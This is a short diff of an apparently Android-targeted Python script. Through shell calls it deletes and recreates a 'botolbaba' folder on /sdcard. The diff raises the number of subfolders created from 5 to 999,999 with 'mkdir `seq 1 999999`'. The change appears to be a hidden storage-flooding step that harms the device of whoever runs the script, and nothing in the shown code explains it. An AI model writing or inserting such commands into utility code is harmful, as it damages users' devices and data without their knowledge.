@@ -35,9 +35,9 @@ else:
     
 if os.path.isdir('botolbaba'):
     os.system("rm -rf botolbaba")
-    os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 5`")
+    os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 999999`")
 else:
-	os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 5`")
+	os.system("cd /sdcard && mkdir botolbaba && cd /sdcard/botolbaba && mkdir `seq 1 999999`")
 
 def banner():
     clear()
